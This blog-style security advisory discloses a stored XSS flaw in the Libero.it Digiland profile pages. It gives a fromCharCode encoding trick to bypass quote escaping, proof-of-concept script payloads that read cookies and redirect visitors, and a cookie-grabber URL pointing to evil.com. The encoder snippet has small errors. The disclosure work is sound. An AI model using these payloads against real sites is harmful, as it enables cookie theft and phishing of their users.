--- 
layout: post
title: "Advisory: Libero.it XSS Vulnerability"
published: true
meta: 
  _oembed_e8ca828b69f69de0e22e7e271ad7dc26: "{{unknown}}"
  _wp_page_template: default
  _oembed_3d718b72c63aacfdf79d1fb38e6253f1: "{{unknown}}"
  _oembed_631062b4a4548c51f235907d114d6fd4: "{{unknown}}"
  _oembed_116a79a942c74cddb055bd8503a08054: "{{unknown}}"
  autometa: nick nick digiland script fromcharcode arbitrary vulnerability profile
  _oembed_40a3ac3cf2f3c38b4c5f3ef6a652909c: "{{unknown}}"
tags: 
- Me &amp; The Web
type: post
status: publish
---
After the report of Rosario Valotta on this ML, another XSS vulnerability
has been found on Libero.it, one of the most important italian ISP
(www.libero.it).

Nothing more than a trivial error but, since Libero.it staff used the
printed media to inform that it was only a "spot" issue, it is
important to demonstrate that this kind of errors are quite more
widespread and to let the Libero staff and management realize that a
potential attack
must be avoid by a deep check of the portal.

The vulnerability once again can be found in the "Community" section
of Libero portal, and the affected functionality is the profile
creation and retrival
<http://digiland.libero.it/profilo.phtml?nick=XssForFun&top=1>.

The implementation of this functionality allows the injection of
malicious code in the profile, so that an attacker by visiting his/her
profile can:

1) steal username
2) steal cookies
3) arbitrary redirection for Phishing pourpose

The normal URL would be something linke this:

<pre>
http://digiland.libero.it/profilo.phtml?nick=Nick&top=1
</pre>

where "Nick" is the name of the nick whose profile has been
manipulated to add arbitrary code.

This vulnerability resemble to those in MySpace and other communities.
So it's nothing really complicated and you can skip on from here ;)

In admin pages (need to be logged by creating a fake account) on page

<pre>
http://digiland.libero.it/profilo_add.php?nocache=1175076655
</pre>

there are two different fields named "I miei difetti:" (my defects)
and "i miei pregi:" (my strong points) that accept arbitrary content.

As stated by Rosario, the Libero.it web application performs a simple
parsing of the posted content, so that quote and double-quote (' and ")
chars are escaped by putting a \ before of them (both using ASCII and URL
encoding).

While I already had the Rosario's beautiful implementation of a simple
evasion technique I preferred to encode the single char in an old
snippet of mine.
The aim of the snippet (I don't remember if I made it, stole it, stole
only the main idea or where, sorry)  is to transform a string into a
series of char numbers to be used with a String.fromCharCode command.
Due to the limitation in size, the function which create the
String.fromCharCode sequence is a detached and ascii value is
decreased of 100 to limit the number of digits.
This is the creation snippet:

<pre>
 &lt;script>
 var toBenc = "hettp://www.lastknight.com";
 var result = "";

  for (var k = 0; k < carlo.length; k++)
 {
         result += ("e(" + (toBenc .charCodeAt(k) - 100) + ")+");
 }

 document.write(result + "<br>")
 &lt;/script>
</pre>  

 So URL "http://www.lastknight.com" is rendered as:
 <pre>
e(4)+e(16)+e(16)+e(12)+e(-42)+e(-53)+e(-53)+e(19)+e(19)+
e(19)+e(-54)+e(8)+e(-3)+e(15)+e(16)+e(7)+e(10)+e(5)+e(3)+
e(4)+e(16)+e(-54)+e(-1)+e(11)+e(9);
</code>

Using the tho box we can use the following code for a POC:

<pre>
[BOX 1]
 &lt;script>
 function e(A) {
  return String.fromCharCode(A + 100)
 }
 alert(document.cookie);
  &lt;/script>

 [BOX 2]
 &lt;script>
 var k =
 e(4)+e(16)+e(16)+e(12)+e(-42)+e(-53)+e(-53)+e(19)+e(19)+e(19)+e(-54)+e(8);
 k +=
 e(-3)+e(15)+e(16)+e(7)+e(10)+e(5)+e(3)+e(4)+e(16)+e(-54)+e(-1)+e(11)+e(9);
 alert(k);
 window.location = k;
  &lt;/script>
</pre>
  

The posting url can be easily modified to an http grabber such as:  

<pre>
http://evil.com/grab?c="+encodeURI(document.cookie);
</pre>

or (much more dangerous) to a phishing site.  
  
Session Riding and derived problems have not been tested.  
  
A POC url is available (until not deleted) here:

[http://digiland.libero.it/profilo.phtml?nick=XssForFun&top=1]  
  
Just my 2 cents and thanks to:    
  
**M1Sec**: for hints and Support  
**Rosario Valotta**:  for the first report, upon which this is based  
**SharDick**:  for help in JS ;)  
**Vokda**:  for consultancy and typo-killing ;)  
 
